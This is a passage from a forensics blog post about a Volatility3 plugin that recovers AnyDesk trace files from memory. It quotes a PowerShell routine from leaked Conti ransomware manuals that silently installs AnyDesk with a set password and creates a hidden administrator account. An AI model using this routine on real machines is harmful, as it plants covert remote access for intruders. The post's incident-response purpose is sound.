<!doctype html>
<html lang="en" dir="ltr" class="blog-wrapper blog-post-page plugin-blog plugin-id-default" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.8.1">
<title data-rh="true">📦 Volatility3 Windows Plugin - AnyDesk | Forensicxlab</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:url" content="https://www.forensicxlab.com/blog/anydesk"><meta data-rh="true" property="og:locale" content="en"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docusaurus_tag" content="default"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" name="docsearch:docusaurus_tag" content="default"><meta data-rh="true" property="og:title" content="📦 Volatility3 Windows Plugin - AnyDesk | Forensicxlab"><meta data-rh="true" name="description" content="When performing incident response, the adversary often uses legitimate remote access software as an interactive command and control channel."><meta data-rh="true" property="og:description" content="When performing incident response, the adversary often uses legitimate remote access software as an interactive command and control channel."><meta data-rh="true" property="og:type" content="article"><meta data-rh="true" property="article:published_time" content="2022-09-30T00:00:00.000Z"><meta data-rh="true" property="article:author" content="https://github.com/k1n0ne"><meta data-rh="true" property="article:tag" content="DFIR,Memory Forensics,Anydesk,Windows"><link data-rh="true" rel="canonical" href="https://www.forensicxlab.com/blog/anydesk"><link data-rh="true" rel="alternate" href="https://www.forensicxlab.com/blog/anydesk" hreflang="en"><link data-rh="true" rel="alternate" href="https://www.forensicxlab.com/blog/anydesk" hreflang="x-default"><script data-rh="true" type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","@id":"https://www.forensicxlab.com/blog/anydesk","mainEntityOfPage":"https://www.forensicxlab.com/blog/anydesk","url":"https://www.forensicxlab.com/blog/anydesk","headline":"📦 Volatility3 Windows Plugin - AnyDesk","name":"📦 Volatility3 Windows Plugin - AnyDesk","description":"When performing incident response, the adversary often uses legitimate remote access software as an interactive command and control channel.","datePublished":"2022-09-30T00:00:00.000Z","author":{"@type":"Person","name":"k1nd0ne","description":"Digital Forensics Spiderman","url":"https://github.com/k1n0ne","image":"https://avatars.githubusercontent.com/u/27780432?v=4"},"keywords":[],"isPartOf":{"@type":"Blog","@id":"https://www.forensicxlab.com/blog","name":"Blog"}}</script><link rel="alternate" type="application/rss+xml" href="/blog/rss.xml" title="Forensicxlab RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/blog/atom.xml" title="Forensicxlab Atom Feed"><link rel="stylesheet" href="/assets/css/styles.02888316.css">
<script src="/assets/js/runtime~main.37f1453b.js" defer="defer"></script>
<script src="/assets/js/main.8ea6917d.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<svg xmlns="http://www.w3.org/2000/svg" style="display: none;"><defs>
<symbol id="theme-svg-external-link" viewBox="0 0 24 24"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"/></symbol>
</defs></svg>
<script>!function(){var t="dark";var e=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();document.documentElement.setAttribute("data-theme",e||t),document.documentElement.setAttribute("data-theme-choice",e||t)}(),function(){try{const c=new URLSearchParams(window.location.search).entries();for(var[t,e]of c)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><link rel="preload" as="image" href="/img/logo.svg"><link rel="preload" as="image" href="https://avatars.githubusercontent.com/u/27780432?v=4"><div role="region" aria-label="Skip to main content"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">Skip to main content</a></div><nav aria-label="Main" class="theme-layout-navbar navbar navbar--fixed-top"><div class="navbar__inner"><div class="theme-layout-navbar-left navbar__items"><button aria-label="Toggle navigation bar" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/"><div class="navbar__logo"><img src="/img/logo.svg" alt="ForensicXlab Logo" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/img/logo.svg" alt="ForensicXlab Logo" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div><b class="navbar__title text--truncate"></b></a></div><div class="theme-layout-navbar-right navbar__items navbar__items--right"><a class="navbar__item navbar__link" href="/docs/thanatology">Thanatology</a><a class="navbar__item navbar__link" href="/docs/exhume">Exhume</a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/blog">Blog</a><a href="https://github.com/forensicxlab" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a><a href="https://discord.gg/AqkYgR5HEg" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">Discord<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a><div class="navbarSearchContainer_Bca1"></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="theme-layout-main main-wrapper mainWrapper_z2l0"><div class="container margin-vert--lg"><div class="row"><aside class="col col--3"><nav class="sidebar_re4s thin-scrollbar" aria-label="Blog recent posts navigation"><div class="sidebarItemTitle_pO2u margin-bottom--md">All posts</div><div role="group"><h3 class="yearGroupHeading_rMGB">2025</h3><ul class="sidebarItemList_Yudw clean-list"><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/blog/thanatology-4">🦉 Thanatology part 4: NTFS Forensics with the Exhume ToolKit.</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/blog/volweb-3-15">📦 VolWeb v3.15 July 2025 Release</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/blog/thanatology-3">🦉 Thanatology part 3: MBR and GPT forensics with the Exhume ToolKit.</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/blog/thanatology-2">🦉 Thanatology part 2: Multiple disk images formats handling using the Exhume ToolKit</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/blog/vmdk">🔦 A quick walkthrough in the VMDK format</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/blog/thanatology">🦉 Thanatology Part 1 - Introducing the Thanatology project</a></li></ul></div><div role="group"><h3 class="yearGroupHeading_rMGB">2023</h3><ul class="sidebarItemList_Yudw clean-list"><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/blog/voliat">📦 Volatility3 : Import Address Table</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/blog/volads">📦 Volatility3 : Alternate Data Stream Scan</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/blog/hibernation">📘 Volatility3: Modern Windows Hibernation file analysis</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/blog/vols3">📘 Volatility3 - Remote analysis on cloud object-storage.</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/blog/steam">🔦 Video Games Forensics - Steam</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/blog/keepass">📦 Volatility3 Windows Plugin - KeePass</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/blog/ewf">🔦 Debunking the Expert Witness Compression Format (EWF)</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/blog/vision">🧬 Malware Analysis with VISION-ProcMon</a></li></ul></div><div role="group"><h3 class="yearGroupHeading_rMGB">2022</h3><ul class="sidebarItemList_Yudw clean-list"><li class="sidebarItem__DBe"><a aria-current="page" class="sidebarItemLink_mo7H sidebarItemLinkActive_I1ZP" href="/blog/anydesk">📦 Volatility3 Windows Plugin - AnyDesk</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/blog/inodes">📦 Volatility3 Linux Plugin - Inodes</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/blog/prefetch">📦 Volatility3 Windows Plugin - Prefetch</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/blog/cb-brave">🖋 Cyberdefenders - Writeup - Brave</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/blog/volaslib">📘 Using Volatility3 as a library</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="/blog/macisf">📄 Volatility3 - ISF for MacOs</a></li></ul></div></nav></aside><main class="col col--7"><article class=""><header><h1 class="title_f1Hy">📦 Volatility3 Windows Plugin - AnyDesk</h1><div class="container_mt6G margin-vert--md"><time datetime="2022-09-30T00:00:00.000Z">September 30, 2022</time> · <!-- -->13 min read</div><div class="margin-top--md margin-bottom--sm row"><div class="col col--12 authorCol_Hf19"><div class="avatar margin-bottom--sm"><a class="avatar__photo-link" href="/blog/authors/k-1-nd-0-ne"><img class="avatar__photo authorImage_XqGP" src="https://avatars.githubusercontent.com/u/27780432?v=4" alt="k1nd0ne"></a><div class="avatar__intro authorDetails_lV9A"><div class="avatar__name"><a href="/blog/authors/k-1-nd-0-ne"><span class="authorName_yefp">k1nd0ne</span></a></div><small class="authorTitle_nd0D" title="Digital Forensics Spiderman">Digital Forensics Spiderman</small><div class="authorSocials_rSDt"><a href="https://x.com/k1nd0ne" target="_blank" rel="noopener noreferrer" class="authorSocialLink_owbf" title="X"><svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" fill="none" viewBox="0 0 1200 1227" style="--dark:#000;--light:#fff" class="authorSocialLink_owbf xSvg_y3PF"><path d="M714.163 519.284 1160.89 0h-105.86L667.137 450.887 357.328 0H0l468.492 681.821L0 1226.37h105.866l409.625-476.152 327.181 476.152H1200L714.137 519.284h.026ZM569.165 687.828l-47.468-67.894-377.686-540.24h162.604l304.797 435.991 47.468 67.894 396.2 566.721H892.476L569.165 687.854v-.026Z"></path></svg></a><a href="https://github.com/k1nd0ne" target="_blank" rel="noopener noreferrer" class="authorSocialLink_owbf" title="GitHub"><svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 256 250" preserveAspectRatio="xMidYMid" style="--dark:#000;--light:#fff" class="authorSocialLink_owbf githubSvg_Uu4N"><path d="M128.001 0C57.317 0 0 57.307 0 128.001c0 56.554 36.676 104.535 87.535 121.46 6.397 1.185 8.746-2.777 8.746-6.158 0-3.052-.12-13.135-.174-23.83-35.61 7.742-43.124-15.103-43.124-15.103-5.823-14.795-14.213-18.73-14.213-18.73-11.613-7.944.876-7.78.876-7.78 12.853.902 19.621 13.19 19.621 13.19 11.417 19.568 29.945 13.911 37.249 10.64 1.149-8.272 4.466-13.92 8.127-17.116-28.431-3.236-58.318-14.212-58.318-63.258 0-13.975 5-25.394 13.188-34.358-1.329-3.224-5.71-16.242 1.24-33.874 0 0 10.749-3.44 35.21 13.121 10.21-2.836 21.16-4.258 32.038-4.307 10.878.049 21.837 1.47 32.066 4.307 24.431-16.56 35.165-13.12 35.165-13.12 6.967 17.63 2.584 30.65 1.255 33.873 8.207 8.964 13.173 20.383 13.173 34.358 0 49.163-29.944 59.988-58.447 63.157 4.591 3.972 8.682 11.762 8.682 23.704 0 17.126-.148 30.91-.148 35.126 0 3.407 2.304 7.398 8.792 6.14C219.37 232.5 256 184.537 256 128.002 256 57.307 198.691 0 128.001 0Zm-80.06 182.34c-.282.636-1.283.827-2.194.39-.929-.417-1.45-1.284-1.15-1.922.276-.655 1.279-.838 2.205-.399.93.418 1.46 1.293 1.139 1.931Zm6.296 5.618c-.61.566-1.804.303-2.614-.591-.837-.892-.994-2.086-.375-2.66.63-.566 1.787-.301 2.626.591.838.903 1 2.088.363 2.66Zm4.32 7.188c-.785.545-2.067.034-2.86-1.104-.784-1.138-.784-2.503.017-3.05.795-.547 2.058-.055 2.861 1.075.782 1.157.782 2.522-.019 3.08Zm7.304 8.325c-.701.774-2.196.566-3.29-.49-1.119-1.032-1.43-2.496-.726-3.27.71-.776 2.213-.558 3.315.49 1.11 1.03 1.45 2.505.701 3.27Zm9.442 2.81c-.31 1.003-1.75 1.459-3.199 1.033-1.448-.439-2.395-1.613-2.103-2.626.301-1.01 1.747-1.484 3.207-1.028 1.446.436 2.396 1.602 2.095 2.622Zm10.744 1.193c.036 1.055-1.193 1.93-2.715 1.95-1.53.034-2.769-.82-2.786-1.86 0-1.065 1.202-1.932 2.733-1.958 1.522-.03 2.768.818 2.768 1.868Zm10.555-.405c.182 1.03-.875 2.088-2.387 2.37-1.485.271-2.861-.365-3.05-1.386-.184-1.056.893-2.114 2.376-2.387 1.514-.263 2.868.356 3.061 1.403Z"></path></svg></a><a href="https://bsky.app/profile/k1nd0ne.bsky.social" target="_blank" rel="noopener noreferrer" class="authorSocialLink_owbf" title="Bluesky"><svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" preserveAspectRatio="xMidYMid" viewBox="0 0 256 226" class="authorSocialLink_owbf"><path fill="#1185FE" d="M55.491 15.172c29.35 22.035 60.917 66.712 72.509 90.686 11.592-23.974 43.159-68.651 72.509-90.686C221.686-.727 256-13.028 256 26.116c0 7.818-4.482 65.674-7.111 75.068-9.138 32.654-42.436 40.983-72.057 35.942 51.775 8.812 64.946 38 36.501 67.187-54.021 55.433-77.644-13.908-83.696-31.676-1.11-3.257-1.63-4.78-1.637-3.485-.008-1.296-.527.228-1.637 3.485-6.052 17.768-29.675 87.11-83.696 31.676-28.445-29.187-15.274-58.375 36.5-67.187-29.62 5.041-62.918-3.288-72.056-35.942C4.482 91.79 0 33.934 0 26.116 0-13.028 34.314-.727 55.491 15.172Z"></path></svg></a></div></div></div></div></div></header><div id="__blog-post-container" class="markdown"><p>When performing incident response, the adversary often uses legitimate remote access software as an interactive command and control channel.
AnyDesk<sup><a href="#user-content-fn-1-026302" id="user-content-fnref-1-026302" data-footnote-ref="true" aria-describedby="footnote-label">1</a></sup> is one of those software being extensively used as a sublayer of persistence by threat actors or access other servers in the environment via RDP<sup><a href="#user-content-fn-2-026302" id="user-content-fnref-2-026302" data-footnote-ref="true" aria-describedby="footnote-label">2</a></sup>.
The latter has been often encountered in the wild in the past years as a preferred tool leveraged by known threat actors.</p>
<p>As such, Anydesk should be closely monitored as threat actors could easily alter or delete data after a successful attack; sometimes it is not possible to restore those altered logs. Defending against malicious actions with such remote software can be even more intricate for organizations having approved its legitimate usage.
Here we propose to leverage memory forensics to retrieve and analyze artefacts thanks to a custom Volatility plugin that I made available as a free open-source tool for improving digital investigations.</p>
<p><em><strong>Conti AnyDesk installation tutorial</strong></em></p>
<p>A striking example came out the last year upon leaked manuals of Conti’s ransomware-as-a-service operators dedicated to its affiliates with pentesting skills<sup><a href="#user-content-fn-3-026302" id="user-content-fnref-3-026302" data-footnote-ref="true" aria-describedby="footnote-label">3</a></sup>.  From this case we can learn how the tool was installed by the attacker using PowerShell.</p>
<div class="language-PowerShell language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">Закреп AnyDesk  </span><span class="token operator">-</span><span class="token plain"> ознакомиться всем</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">Function</span><span class="token plain"> AnyDesk </span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    mkdir </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;C:\ProgramData\AnyDesk&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token comment" style="color:rgb(98, 114, 164)"># Download AnyDesk</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token variable" style="color:rgb(189, 147, 249);font-style:italic">$clnt</span><span class="token plain"> = </span><span class="token function" style="color:rgb(80, 250, 123)">new-object</span><span class="token plain"> System</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">Net</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">WebClient</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token variable" style="color:rgb(189, 147, 249);font-style:italic">$url</span><span class="token plain"> = </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;http://download.anydesk.com/AnyDesk.exe&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token variable" style="color:rgb(189, 147, 249);font-style:italic">$file</span><span class="token plain"> = </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;C:\ProgramData\AnyDesk.exe&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token variable" style="color:rgb(189, 147, 249);font-style:italic">$clnt</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">DownloadFile</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token variable" style="color:rgb(189, 147, 249);font-style:italic">$url</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token variable" style="color:rgb(189, 147, 249);font-style:italic">$file</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    cmd</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">exe </span><span class="token operator">/</span><span class="token plain">c C:\ProgramData\AnyDesk</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">exe </span><span class="token operator">--</span><span class="token plain">install C:\ProgramData\AnyDesk </span><span class="token operator">--</span><span class="token function" style="color:rgb(80, 250, 123)">start-with</span><span class="token operator">-</span><span class="token plain">win </span><span class="token operator">--</span><span class="token plain">silent</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    cmd</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">exe </span><span class="token operator">/</span><span class="token plain">c </span><span class="token function" style="color:rgb(80, 250, 123)">echo</span><span class="token plain"> J9kzQ2Y0qO </span><span class="token punctuation" style="color:rgb(248, 248, 242)">|</span><span class="token plain"> C:\ProgramData\anydesk</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">exe </span><span class="token operator">--</span><span class="token function" style="color:rgb(80, 250, 123)">set-password</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    net user oldadministrator </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;qc69t4B#Z0kE3&quot;</span><span class="token plain"> </span><span class="token operator">/</span><span class="token plain">add</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    net localgroup Administrators oldadministrator </span><span class="token operator">/</span><span class="token plain">ADD</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    reg add </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist&quot;</span><span class="token plain"> </span><span class="token operator">/</span><span class="token plain">v oldadministrator </span><span class="token operator">/</span><span class="token plain">t REG_DWORD </span><span class="token operator">/</span><span class="token plain">d 0 </span><span class="token operator">/</span><span class="token plain">f</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    cmd</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">exe </span><span class="token operator">/</span><span class="token plain">c C:\ProgramData\AnyDesk</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">exe </span><span class="token operator">--</span><span class="token function" style="color:rgb(80, 250, 123)">get-id</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    AnyDesk</span><br></span></code></pre></div></div>
<p>In this blog post, we will cover which files linked to anydesk are useful and how valuable it can be upon an investigation. Eventually, in the case where an intrusion set is deleting those files using an anti-forensics technique, a volatility3 plugin will be proposed to retrieve that information, which might still reside in memory.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="anydesk-trace-files">AnyDesk trace files<a href="#anydesk-trace-files" class="hash-link" aria-label="Direct link to AnyDesk trace files" title="Direct link to AnyDesk trace files">​</a></h2>
<p>When using Anydesk, specific files<sup><a href="#user-content-fn-4-026302" id="user-content-fnref-4-026302" data-footnote-ref="true" aria-describedby="footnote-label">4</a></sup> are written to trace the activity of the application. There are two files of particular interest:</p>
<ul>
<li>ad.trace</li>
<li>ad_svc.trace (only at installed version)</li>
</ul>
<p>On a windows 10 machine, you can respectively find those files in the <code>%APPDATA%\AnyDesk\</code> and <code>%SYSTEMROOT%\ProgramData\AnyDesk\</code>.
Here is an example of data you could find within the log file:</p>
<p><em><strong>ad.trace content example</strong></em></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">info </span><span class="token number">2022</span><span class="token plain">-09-27 </span><span class="token number">15</span><span class="token plain">:31:53.920       back   </span><span class="token number">3240</span><span class="token plain">   </span><span class="token number">5476</span><span class="token plain">                   app.backend_session - Starting session </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">deskrt, clipboard, chat, audio, input, tcp_tunnel</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain">.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">info </span><span class="token number">2022</span><span class="token plain">-09-27 </span><span class="token number">15</span><span class="token plain">:31:53.920       back   </span><span class="token number">3240</span><span class="token plain">   </span><span class="token number">5476</span><span class="token plain">                       desk_rt.encoder - </span><span class="token number">2</span><span class="token plain"> segments.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">info </span><span class="token number">2022</span><span class="token plain">-09-27 </span><span class="token number">15</span><span class="token plain">:31:53.923       back   </span><span class="token number">3240</span><span class="token plain">   </span><span class="token number">5476</span><span class="token plain">                     base.monitor_info - Monitors found: </span><span class="token number">1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">info </span><span class="token number">2022</span><span class="token plain">-09-27 </span><span class="token number">15</span><span class="token plain">:31:53.923       back   </span><span class="token number">3240</span><span class="token plain">   </span><span class="token number">5476</span><span class="token plain">                   app.backend_session - Suspending session start </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">until</span><span class="token plain"> further notice.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">info </span><span class="token number">2022</span><span class="token plain">-09-27 </span><span class="token number">15</span><span class="token plain">:31:53.925       back   </span><span class="token number">3240</span><span class="token plain">   </span><span class="token number">5476</span><span class="token plain">                   app.backend_session - Continueing session start.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">info </span><span class="token number">2022</span><span class="token plain">-09-27 </span><span class="token number">15</span><span class="token plain">:31:53.925       back   </span><span class="token number">3240</span><span class="token plain">   </span><span class="token number">5476</span><span class="token plain">             desk_rt.capture_component - Starting capture.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">info </span><span class="token number">2022</span><span class="token plain">-09-27 </span><span class="token number">15</span><span class="token plain">:31:53.925       back   </span><span class="token number">3240</span><span class="token plain">   </span><span class="token number">3892</span><span class="token plain">            capture.dda_stream_capture - Initializing D3D.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">info </span><span class="token number">2022</span><span class="token plain">-09-27 </span><span class="token number">15</span><span class="token plain">:31:53.926       ctrl   </span><span class="token number">6572</span><span class="token plain">   </span><span class="token number">1320</span><span class="token plain">                        ad_app.control - Session count: </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token number">1</span><span class="token plain">, </span><span class="token number">1</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">info </span><span class="token number">2022</span><span class="token plain">-09-27 </span><span class="token number">15</span><span class="token plain">:31:53.927       ctrl   </span><span class="token number">6572</span><span class="token plain">   </span><span class="token number">1320</span><span class="token plain">                       clipbrd.capture - Registered </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">for</span><span class="token plain"> clipboard notifications.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">info </span><span class="token number">2022</span><span class="token plain">-09-27 </span><span class="token number">15</span><span class="token plain">:31:53.927       ctrl   </span><span class="token number">6572</span><span class="token plain">   </span><span class="token number">1320</span><span class="token plain">                    app.ctrl_clip_comp - Ready.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">info </span><span class="token number">2022</span><span class="token plain">-09-27 </span><span class="token number">15</span><span class="token plain">:31:53.927       ctrl   </span><span class="token number">6572</span><span class="token plain">   </span><span class="token number">1320</span><span class="token plain">                     win_app.wallpaper - Starting wallpaper.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">info </span><span class="token number">2022</span><span class="token plain">-09-27 </span><span class="token number">15</span><span class="token plain">:31:53.948       back   </span><span class="token number">3240</span><span class="token plain">   </span><span class="token number">5476</span><span class="token plain">             desk_rt.capture_component - Sending </span><span class="token function" style="color:rgb(80, 250, 123)">screen</span><span class="token plain"> privacy status: off </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">no change</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain">.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">info </span><span class="token number">2022</span><span class="token plain">-09-27 </span><span class="token number">15</span><span class="token plain">:31:53.948       back   </span><span class="token number">3240</span><span class="token plain">   </span><span class="token number">5476</span><span class="token plain">                        app.mouse_sink - Starting mouse sink.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">info </span><span class="token number">2022</span><span class="token plain">-09-27 </span><span class="token number">15</span><span class="token plain">:31:53.950       back   </span><span class="token number">3240</span><span class="token plain">   </span><span class="token number">4136</span><span class="token plain">             desk_rt.capture_component - Keyboard layout changed to: unknown</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">info </span><span class="token number">2022</span><span class="token plain">-09-27 </span><span class="token number">15</span><span class="token plain">:31:53.950       back   </span><span class="token number">3240</span><span class="token plain">   </span><span class="token number">4136</span><span class="token plain">             desk_rt.capture_component - Focused monitor changed: </span><span class="token number">0</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">\</span><span class="token punctuation" style="color:rgb(248, 248, 242)">\</span><span class="token plain">.</span><span class="token punctuation" style="color:rgb(248, 248, 242)">\</span><span class="token plain">DISPLAY1</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><br></span></code></pre></div></div>
<p><em><strong>ad_svc.trace content example</strong></em></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">info </span><span class="token number">2022</span><span class="token plain">-09-27 </span><span class="token number">15</span><span class="token plain">:30:44.538       gsvc   </span><span class="token number">9068</span><span class="token plain">   </span><span class="token number">5920</span><span class="token plain">    </span><span class="token number">1</span><span class="token plain">                      app.service - New IPC connection.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  info </span><span class="token number">2022</span><span class="token plain">-09-27 </span><span class="token number">15</span><span class="token plain">:30:44.538       gsvc   </span><span class="token number">9068</span><span class="token plain">   </span><span class="token number">5920</span><span class="token plain">    </span><span class="token number">1</span><span class="token plain">                  fiber.scheduler - Spawning child fiber </span><span class="token number">13</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 